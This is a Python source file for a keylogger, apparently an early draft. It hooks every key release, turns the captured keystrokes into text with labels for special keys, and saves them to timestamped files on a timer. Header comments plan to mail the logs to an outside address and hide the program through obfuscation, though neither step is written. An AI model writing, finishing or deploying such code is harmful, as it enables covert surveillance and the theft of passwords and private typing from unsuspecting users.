#python -m pip install keyboard
# Ide: Record key strokes
# Send to some mail address
# -  First: Save results every TIME seconds to txt file...
# Maybe hide itself using garbage, and encode everything as ascii?

import keyboard
import time
import threading

class Keylogger:
    def __init__(self, interval, doLogClear, doLogOutput):
        self.doLogClear = doLogClear
        self.doLogOutput = doLogOutput
        self.interval = interval
        self.log = "" #How we create locals for classes
        self.filename = ""
        self.time = ""

    #def setLog(self, msg):
    #    self.log = msg

    def callback_function(self, event): #This function is called every time the on_release event happens (each time a key is lifted). Using the keyboard.hook gives for both UP and DOWN
        char = event.name
        char_code = event.scan_code

        print(event.scan_code)


        if char_code == 57: #Space
            self.log += ' '
        elif char_code == 28:
            self.log += '[ENTER]'
        elif char_code == 29:
            self.log += '[CTRL]'
        elif char_code == 56:
            self.log += '[ALT]'
        elif char_code == 15:
            self.log += '[TAB]'
        elif char_code == 42:
            self.log += '[SHIFT]'
        
        else:
            self.log += char

        #print(event.name)
        #print(self.log)
        
        #if char == 'a':
        #    print(self.log)
   
    def clearLog(self):
        self.log = ""

    def getTime(self):
        self.time = time.ctime(time.time()).replace(' ', '_').replace(':', '_') #Format: Day_Month_Date_Time_Year

    def outputLog(self):
        threading.Timer(self.interval, self.outputLog, self.getTime()).start()
        
        filename = "log_at_" + self.time + ".txt"
        print("Filename: " + filename)
        #print(self.log)
        f = open(filename, "x")
        f.write(self.log) 
        f.close()
        if self.doLogClear: self.clearLog()

    def startLogger(self):
        #print("")
        keyboard.on_release(self.callback_function)
        if self.doLogOutput: self.outputLog()
        keyboard.wait()





if __name__ == "__main__":
    keylogger = Keylogger(10.0, True, False)
    #keylogger.setLog("foo")
    #keylogger.getLog()
    keylogger.startLogger()
    keylogger.outputLog() #Testing action every INTERVAL seconds
